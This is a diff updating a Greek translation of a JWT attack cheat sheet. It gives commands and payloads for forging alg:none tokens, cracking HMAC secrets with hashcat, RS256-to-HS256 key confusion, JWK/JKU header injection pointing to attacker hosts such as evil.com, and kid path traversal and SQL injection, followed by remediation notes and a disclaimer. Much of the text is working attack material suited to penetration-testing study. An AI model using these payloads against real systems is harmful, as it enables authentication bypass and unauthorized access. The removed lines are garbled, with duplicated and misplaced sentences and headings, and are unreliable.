@@ -1,12 +1,16 @@
-# 🎟️ JWT-Attacks — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎟️ JWT Attacks - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
        ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
        ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
@@ -16,87 +20,81 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
              JSON Web Token Exploitation & Security Testing Guide
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
   <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
   <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
-  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
+  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Δοκιμή API">
 </p>
 
 <p align="center">
-  <b>🛡️ Comprehensive methodology and practical commands for exploiting JSON Web Token (JWT) vulnerabilities</b>
+  <b>🛡️ Περιεκτική μεθοδολογία και πρακτικές εντολές για την εκμετάλλευση τρωτών σημείων JSON Web Token (JWT)</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-introduction--anatomy-of-a-jwt)
-- [Essential Testing Tools](#-essential-testing-tools)
+- [Introduction & Anatomy of a JWT](#-introduction--anatomy-of-a-jwt)
+- [Essential Testing Tools] (#-essential-testing-tools)
 - [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
   - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
   - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
-  - [3. Algorithm Confusion / Key Confusion (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
+  - [3. Σύγχυση αλγορίθμου / Σύγχυση κλειδιού (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
   - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
-  - [3. Sign the token with your matching private key.](#5-jku-jwk-set-url-misconfiguration--ssrf)
-  - [> - `https://trusted.com@attacker.com/jwks.json`](#6-kid-key-id-header-manipulation--injections)
-  - [Inject a known static string:](#7-cross-service-relaying--sensitive-data-leakage)
-- [Automating Tests with `jwt_tool`](#-automating-tests-with-jwt_tool)
-- [Cracking JWT Secrets with Hashcat](#-cracking-jwt-secrets-with-hashcat)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+  - [5. JKU (JWK Set URL) Εσφαλμένη διαμόρφωση & SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
+  - [6. KID (Key ID) Header Manipulation & Injections](#6-kid-key-id-header-manipulation--injections)
+  - [7. Cross-Service Relaying & Sensitive Data Leakage](#7-cross-service-relaying--sensitive-data-leakage)
+- [Αυτοματοποίηση δοκιμών με `jwt_tool`](#-automating-tests-with-jwt_tool)
+- [Διάσπαση μυστικών JWT με Hashcat](#-cracking-jwt-secrets-with-hashcat)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Remediation & Secure Implementation](#-remediation--secure-implementation)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Πηγές και αναφορές](#-resources)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
+- [Πόροι](#-πόροι)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Εισαγωγή & Ανατομία ενός JWT
 
-A **JSON Web Token (JWT)** is a compact, URL-safe means of representing claims between two parties. Commonly used for session authentication in modern REST APIs, Single Page Applications (SPAs), and microservices.
+Ένα **JSON Web Token (JWT)** είναι ένα συμπαγές, ασφαλές για URL μέσο για την αντιπροσώπευση αξιώσεων μεταξύ δύο μερών. Χρησιμοποιείται συνήθως για έλεγχο ταυτότητας περιόδου σύνδεσης σε σύγχρονα API REST, Εφαρμογές μεμονωμένης σελίδας (SPA) και μικροϋπηρεσίες.
 
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
-
+Ένα τυπικό JWT αποτελείται από τρία μέρη με κωδικοποίηση Base64URL που χωρίζονται με τελείες (`.`):
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
 [------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
 ```
-
-1. **Header:** Identifies the token type and the cryptographic algorithm used (e.g., `HS256`, `RS256`, `none`).
-2. **Payload:** Contains the claims (e.g., `user_id`, `role`, expiration `exp`). *Note: Payloads are encoded, NOT encrypted!*
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
+1. **Κεφαλίδα:** Προσδιορίζει τον τύπο διακριτικού και τον κρυπτογραφικό αλγόριθμο που χρησιμοποιείται (π.χ. `HS256`, `RS256`, `none`).
+2. **Ωφέλιμο φορτίο:** Περιέχει τις αξιώσεις (π.χ. `user_id`, `role`, λήξη `exp`). *Σημείωση: Τα ωφέλιμα φορτία είναι κωδικοποιημένα, ΟΧΙ κρυπτογραφημένα!*
+3. **Υπογραφή:** Δημιουργήθηκε με κατακερματισμό της κωδικοποιημένης κεφαλίδας και του ωφέλιμου φορτίου χρησιμοποιώντας ένα μυστικό κλειδί ή ιδιωτικό κλειδί.
 
 ---
 
-## 🛠️ Essential Testing Tools
+## 🛠️ Βασικά εργαλεία δοκιμών
 
-3. **Signature:** Created by hashing the encoded Header and Payload using a secret key or private key.
-2. **Hashcat:** Fast GPU-based HMAC secret cracking (Mode `16500`).
-3. **Burp Suite Extension:** "JWT Editor" by Fraser Winterborn (in PortSwigger BApp Store).
+1. **jwt_tool:** Εργαλειοθήκη γραμμής εντολών για ανάλυση, δοκιμή και διάρρηξη JWT.
+2. **Hashcat:** Γρήγορο μυστικό σπάσιμο HMAC που βασίζεται σε GPU (Λειτουργία `16500`).
+3. **Επέκταση Burp Suite:** "JWT Editor" από τον Fraser Winterborn (στο PortSwigger BApp Store).
 
-### 🛠️ Essential Testing Tools
-
+### Εγκατάσταση του `jwt_tool`
 ```bash
 git clone https://github.com/ticarpi/jwt_tool
 cd jwt_tool
 python3 -m pip install -r requirements.txt
 alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
 ```
-
 ---
 
-## 💥 Vulnerability Matrix & Attack Vectors
+## 💥 Πίνακας ευπάθειας και διανύσματα επίθεσης
 
-### 1. None Algorithm Flaw (`alg: "none"`)
+### 1. Κανένα ελάττωμα αλγορίθμου (`alg: "none"`)
 
-**Mechanism:**
-Some JWT verification libraries consider tokens valid if the `alg` header is set to `none`, completely bypassing signature verification.
+**Μηχανισμός:**
+Ορισμένες βιβλιοθήκες επαλήθευσης JWT θεωρούν τα διακριτικά έγκυρα εάν η κεφαλίδα `alg` έχει οριστεί σε `none`, παρακάμπτοντας πλήρως την επαλήθευση υπογραφής.
 
-**Exploitation:**
-1. None Algorithm Flaw (`alg: "none"`)
-2. Modify payload claims (e.g., `"role": "admin"`).
-Mechanism:
-
+**Αξιοποίηση:**
+1. Αποκωδικοποιήστε την κεφαλίδα και αλλάξτε το `"alg": "HS256"` σε `"alg": "none"`.
+2. Τροποποίηση αξιώσεων ωφέλιμου φορτίου (π.χ. `"role": "admin"`).
+3. Αφαιρέστε το τμήμα υπογραφής (κρατήστε την τελική κουκκίδα!).
 ```bash
 # Using jwt_tool to forge 'none' algorithm token
 python3 jwt_tool.py <TOKEN> -X a
@@ -104,20 +102,18 @@ python3 jwt_tool.py <TOKEN> -X a
 # Test various casing variations (none, None, NONE, nOnE)
 python3 jwt_tool.py <TOKEN> -T -S none
 ```
-
-*Manual Token Structure:*
+*Χειροκίνητη Δομή Token:*
 ```text
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
 ```
-
 ---
 
-### 2. Weak HMAC Secret Cracking (HS256)
+### 2. Αδύναμη μυστική ρωγμή HMAC (HS256)
 
-**Mechanism:**
-If the server signs tokens using symmetric algorithms (`HS256`, `HS384`, `HS512`) with a guessable or weak secret key (e.g., `secret`, `admin123`, company name), an attacker can brute-force the secret offline and sign arbitrary tokens.
+**Μηχανισμός:**
+Εάν ο διακομιστής υπογράφει διακριτικά χρησιμοποιώντας συμμετρικούς αλγόριθμους (`HS256`, `HS384`, `HS512`) με ένα μαντέψιμο ή αδύναμο μυστικό κλειδί (π.χ. `secret`, `admin123`, όνομα εταιρείας), ένας εισβολέας μπορεί να εξαναγκάσει τα μυστικά εκτός σύνδεσης και να υπογράψει αυθαίρετα διακριτικά.
 
-**Cracking with Hashcat:**
+** Σπάσιμο με Hashcat:**
 ```bash
 # Save the full JWT to a file
 echo "eyJhbGciOi..." > jwt.txt
@@ -125,58 +121,53 @@ echo "eyJhbGciOi..." > jwt.txt
 # Crack using Hashcat Mode 16500 (JWT Secret)
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 ```
-
-**Forging Token After Cracking:**
+**Σφυρηλάτηση κουπόνι μετά το ράγισμα:**
 ```bash
 python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
 ```
-
 ---
 
-### 3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
+### 3. Σύγχυση αλγορίθμου / Σύγχυση κλειδιού (RS256 -> HS256)
 
-**Mechanism:**
-- **RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-- **HS256 (Symmetric)**: Signed and verified with the **same shared secret**.
+**Μηχανισμός:**
+- **RS256 (Ασύμμετρο):** Υπογεγραμμένο με το ιδιωτικό κλειδί του διακομιστή. επαληθεύτηκε με το **δημόσιο κλειδί** του διακομιστή.
+- **HS256 (Συμμετρικό):** Υπογεγραμμένο και επαληθευμένο με το **το ίδιο κοινό μυστικό**.
 
-3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
-1. Obtain the server's public key (often publicly exposed at `/.well-known/jwks.json` or certificates).
-Mechanism:
-RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-4. The server receives the token, sees `HS256`, and verifies the signature using its configured verification key (which is its public key), resulting in a valid signature!
+Εάν η βιβλιοθήκη backend δεν επιβάλλει αυστηρά τους τύπους αλγορίθμων, ένας εισβολέας μπορεί:
+1. Αποκτήστε το δημόσιο κλειδί του διακομιστή (συχνά εκτίθεται δημόσια στο `/.well-known/jwks.json` ή πιστοποιητικά).
+2. Αλλάξτε την κεφαλίδα αλγορίθμου του διακριτικού από `RS256` σε `HS256`.
+3. Υπογράψτε το τροποποιημένο διακριτικό με το **δημόσιο κλειδί** του διακομιστή ως μυστικό HMAC!
+4. Ο διακομιστής λαμβάνει το διακριτικό, βλέπει το `HS256` και επαληθεύει την υπογραφή χρησιμοποιώντας το διαμορφωμένο κλειδί επαλήθευσης (που είναι το δημόσιο κλειδί του), με αποτέλεσμα μια έγκυρη υπογραφή!
 
-**Exploitation via `jwt_tool`:**
+**Εκμετάλλευση μέσω `jwt_tool`:**
 ```bash
 # Supply the server's public key and perform key confusion
 python3 jwt_tool.py <TOKEN> -X k -pk public.pem
 ```
-
 ---
 
 ### 4. JWK (JSON Web Key) Header Injection
 
-**Mechanism:**
-The JWT specification allows an embedded public key in the `jwk` header parameter. Vulnerable servers trust this header key to verify the signature without checking if the key belongs to a trusted CA or pre-shared whitelist.
+**Μηχανισμός:**
+Η προδιαγραφή JWT επιτρέπει ένα ενσωματωμένο δημόσιο κλειδί στην παράμετρο κεφαλίδας `jwk`. Οι ευάλωτοι διακομιστές εμπιστεύονται αυτό το κλειδί κεφαλίδας για την επαλήθευση της υπογραφής χωρίς να ελέγχουν εάν το κλειδί ανήκει σε μια αξιόπιστη ΑΠ ή σε μια προ-κοινόχρηστη λίστα επιτρεπόμενων.
 
-**Exploitation:**
-4. JWK (JSON Web Key) Header Injection
-2. Embed the public key in the `jwk` header.
-Mechanism:
-
+**Αξιοποίηση:**
+1. Δημιουργήστε ένα ζεύγος κλειδιών RSA εισβολέα.
+2. Ενσωματώστε το δημόσιο κλειδί στην κεφαλίδα `jwk`.
+3. Υπογράψτε το διακριτικό με το αντίστοιχο ιδιωτικό κλειδί σας.
 ```bash
 # Inject self-signed key in header using jwt_tool
 python3 jwt_tool.py <TOKEN> -X i
 ```
-
 ---
 
-### 3. Sign the token with your matching private key.
+### 5. JKU (JWK Set URL) Εσφαλμένη διαμόρφωση & SSRF
 
-**Mechanism:**
-The `jku` (JWK Set URL) header specifies a remote URL from which the server should fetch the public key set to verify the token.
+**Μηχανισμός:**
+Η κεφαλίδα `jku` (JWK Set URL) καθορίζει μια απομακρυσμένη διεύθυνση URL από την οποία ο διακομιστής πρέπει να ανακτήσει το σύνολο του δημόσιου κλειδιού για την επαλήθευση του διακριτικού.
 
-**Exploitation:**
-5. JKU (JWK Set URL) Misconfiguration & SSRF
+**Αξιοποίηση:**
+1. Φιλοξενήστε το δικό σας `jwks.json` σε διακομιστή ιστού εισβολέα:
    ```json
    {
      "keys": [
@@ -190,7 +181,7 @@ The `jku` (JWK Set URL) header specifies a remote URL from which the server shou
      ]
    }
    ```
-Mechanism:
+2. Τροποποιήστε την κεφαλίδα του διακριτικού:
    ```json
    {
      "alg": "RS256",
@@ -199,22 +190,22 @@ Mechanism:
      "kid": "attacker-key"
    }
    ```
-3. Sign the token with your private key.
+3. Υπογράψτε το διακριτικό με το ιδιωτικό σας κλειδί.
 
-> **Bypassing URL Whitelists:**
-> If the application validates domain endings, test open redirects or URL parsing quirks:
-2. Modify the token header:
+> **Παράκαμψη λιστών επιτρεπόμενων διευθύνσεων URL:**
+> Εάν η εφαρμογή επικυρώνει τις καταλήξεις τομέα, δοκιμάστε ανοιχτές ανακατευθύνσεις ή ιδιορρυθμίες ανάλυσης διευθύνσεων URL:
+> - `https://trusted.com@attacker.com/jwks.json`
 > - `https://trusted.com.attacker.com/jwks.json`
-3. Sign the token with your private key.
+> - Άνοιγμα ανακατεύθυνσης: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
 
 ---
 
-### > - `https://trusted.com@attacker.com/jwks.json`
+### 6. KID (Key ID) Header Manipulation & Injections
 
-> - Open redirect: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
+Η κεφαλίδα `kid` είναι μια συμβολοσειρά που χρησιμοποιείται για τον προσδιορισμό του κλειδιού που πρέπει να φορτωθεί από μια βάση δεδομένων ή ένα σύστημα αρχείων.
 
-#### A. Directory Traversal to Empty File (`/dev/null`)
-If the server reads the key file from disk using `kid`:
+#### A. Διέλευση καταλόγου σε κενό αρχείο (`/dev/null`)
+Εάν ο διακομιστής διαβάζει το αρχείο κλειδιού από το δίσκο χρησιμοποιώντας το `kid`:
 ```json
 {
   "alg": "HS256",
@@ -222,14 +213,14 @@ If the server reads the key file from disk using `kid`:
   "kid": "/dev/null"
 }
 ```
-Sign the token with an empty secret (`""` / 0 bytes)!
+Υπογράψτε το διακριτικό με ένα κενό μυστικό (`""` / 0 byte)!
 
-#### B. SQL Injection via KID
-A. Directory Traversal to Empty File (`/dev/null`)
+#### B. SQL Injection μέσω KID
+Εάν ο διακομιστής ανακτήσει το μυστικό από μια βάση δεδομένων:
 ```sql
 SELECT secret FROM keys WHERE kid = 'INPUT';
 ```
-Inject a known static string:
+Εισάγετε μια γνωστή στατική συμβολοσειρά:
 ```json
 {
   "alg": "HS256",
@@ -237,37 +228,33 @@ Inject a known static string:
   "kid": "key' UNION SELECT 'my_known_secret'-- -"
 }
 ```
-Sign the token using the secret `'my_known_secret'`.
+Υπογράψτε το διακριτικό χρησιμοποιώντας το μυστικό `'my_known_secret'`.
 
 ---
 
-### Inject a known static string:
+### 7. Αναμετάδοση πολλαπλών υπηρεσιών & διαρροή ευαίσθητων δεδομένων
 
-- **Unencrypted PII**: Developers frequently store passwords, SSNs, or sensitive user metadata in the payload, forgetting it is only Base64URL-encoded, not encrypted.
-- **Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
+- **Μη κρυπτογραφημένα PII:** Οι προγραμματιστές αποθηκεύουν συχνά κωδικούς πρόσβασης, SSN ή ευαίσθητα μεταδεδομένα χρήστη στο ωφέλιμο φορτίο, ξεχνώντας ότι είναι μόνο κωδικοποιημένα με Base64URL και όχι κρυπτογραφημένα.
+- **Σύγχυση υπηρεσίας:** Χρήση ενός διακριτικού που προορίζεται για μια υπηρεσία χαμηλών προνομίων (π.χ., το API ανάλυσης) έναντι ενός εσωτερικού διαχειριστικού API.
 
 ---
 
-## ⚡ Automating Tests with `jwt_tool`
+## ⚡ Αυτοματοποίηση δοκιμών με `jwt_tool`
 
-### Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
-The easiest way to scan for all known vulnerabilities automatically:
-
+### Εκτελέστε όλες τις ενσωματωμένες επιθέσεις Playbook
+Ο ευκολότερος τρόπος αυτόματης σάρωσης για όλες τις γνωστές ευπάθειες:
 ```bash
 # Launch full automated playbook scan
 python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
 ```
-
-### Interactive Tampering Mode
+### Διαδραστική λειτουργία παραβίασης
 ```bash
 # Interactively edit header or payload claims
 python3 jwt_tool.py <TOKEN> -T
 ```
-
 ---
 
-## 🔓 Cracking JWT Secrets with Hashcat
-
+## 🔓 Σπάσιμο μυστικών JWT με το Hashcat
 ```bash
 # 1. Format: Put token alone in a file
 echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt
@@ -278,46 +265,45 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3
 # 3. Rule-based attack
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-
 ---
 
-## 📊 Γρήγορη αναφορά
+## 📊 Γρήγορος πίνακας αναφοράς
 
-|Vulnerability|Attack Technique|Key Payload / Flag|
+| Ευπάθεια | Τεχνική επίθεσης | Ωφέλιμο φορτίο κλειδιού / Σημαία |
 |---------------|------------------|--------------------|
-|**None Algorithm**|Set `alg: "none"`, strip signature|`jwt_tool <TOKEN> -X a`|
-|**Weak Secret**|GPU dictionary brute-force|`hashcat -m 16500 jwt.txt rockyou.txt`|
-|**Algorithm Confusion**|Change RS256 to HS256, sign with public key|`jwt_tool <TOKEN> -X k -pk pub.pem`|
-|**JWK Injection**|Embed attacker public key in header|`jwt_tool <TOKEN> -X i`|
-|**JKU Injection**|Point `jku` to external server|`"jku": "http://evil.com/jwks.json"`|
-|**KID Path Traversal**|Point `kid` to `/dev/null` or known file|`"kid": "/dev/null"` (Sign with `""`)|
-|**KID SQLi**|Inject static secret into SQL query|`"kid": "' UNION SELECT 'secret'-- -"`|
+| **Κανένας αλγόριθμος** | Σετ `alg: "none"`, strip signature | `jwt_tool <TOKEN> -X a` |
+| **Αδύναμο μυστικό** | Λεξικό GPU brute-force | `hashcat -m 16500 jwt.txt rockyou.txt` |
+| **Σύγχυση αλγορίθμου**| Αλλάξτε το RS256 σε HS256, υπογράψτε με δημόσιο κλειδί | `jwt_tool <TOKEN> -X k -pk pub.pem` |
+| **JWK Injection** | Ενσωμάτωση δημόσιου κλειδιού εισβολέα στην κεφαλίδα | `jwt_tool <TOKEN> -X i` |
+| **JKU Injection** | Τοποθετήστε το `jku` σε εξωτερικό διακομιστή | `"jku": "http://evil.com/jwks.json"` |
+| **Διάβαση διαδρομής KID**| Σημειώστε `kid` έως `/dev/null` ή γνωστό αρχείο | `"kid": "/dev/null"` (Υπογραφή με `""`) |
+| **KID SQLi** | Εισαγωγή στατικού μυστικού στο ερώτημα SQL | `"kid": "' UNION SELECT 'secret'-- -"` |
 
 ---
 
-## 🛡️ Remediation & Secure Implementation
+## 🛡️ Αποκατάσταση & Ασφαλής Εφαρμογή
 
-1. **Explicitly Whitelist Algorithms:**
-   Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-2. **Reject `alg: none` Tokens:**
-   Ensure the library strictly rejects unverified or unsigned tokens.
-3. **Use Long, Cryptographically Secure Secrets:**
-   HMAC secrets must be at least 256 bits (32+ random characters) generated by a secure CSPRNG.
-4. **Validate `jku` and `jwk` Headers:**
-Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-5. **Sanitize `kid` Values:**
-Ensure the library strictly rejects unverified or unsigned tokens.
-
----
-
-## ⚠️ Legal Disclaimer
-
-> **IMPORTANT:** JWT attacks can lead to full authentication bypass and unauthorized access to application databases. This guide is strictly intended for educational purposes and authorized penetration testing.
+1. **Ρητοί αλγόριθμοι λευκής λίστας:**
+   Ποτέ μην επιτρέπεται η επιλογή `alg` που ελέγχεται από τον πελάτη. Επιτρεπόμενοι αλγόριθμοι σκληρού κώδικα στον διακομιστή (π.χ. να επιτρέπεται αποκλειστικά το `RS256`).
+2. **Απορρίψτε τα διακριτικά `alg: none`:**
+   Βεβαιωθείτε ότι η βιβλιοθήκη απορρίπτει αυστηρά μη επαληθευμένα ή ανυπόγραφα διακριτικά.
+3. **Χρησιμοποιήστε μακριά, κρυπτογραφικά ασφαλή μυστικά:**
+   Τα μυστικά HMAC πρέπει να είναι τουλάχιστον 256 bit (32+ τυχαίοι χαρακτήρες) που δημιουργούνται από ένα ασφαλές CSPRNG.
+4. **Επικύρωση κεφαλίδων `jku` και `jwk`:**
+   Λήψη συνόλων JWK μόνο από μια αυστηρή λίστα επιτρεπόμενων εσωτερικών αξιόπιστων διευθύνσεων URL. απόρριψη εξωτερικών τομέων που παρέχονται από τον χρήστη.
+5. **Απολύστε τις τιμές `kid`:**
+   Αντιμετωπίστε το `kid` ως μη αξιόπιστη είσοδο χρήστη. απολυμάνετε έναντι της διέλευσης καταλόγου (`../`) και της ένεσης SQL.
 
 ---
 
-## 📚 Πηγές και αναφορές
+## ⚠️ Νομική αποποίηση ευθύνης
+
+> **ΣΗΜΑΝΤΙΚΟ:** Οι επιθέσεις JWT μπορούν να οδηγήσουν σε πλήρη παράκαμψη ελέγχου ταυτότητας και μη εξουσιοδοτημένη πρόσβαση στις βάσεις δεδομένων εφαρμογών. Αυτός ο οδηγός προορίζεται αυστηρά για εκπαιδευτικούς σκοπούς και για εξουσιοδοτημένες δοκιμές διείσδυσης.
+
+---
+
+## 📚 Πόροι
 
 - [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
 - [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
-- [RFC 7519 - JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)
+- [RFC 7519 - Πρότυπο JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
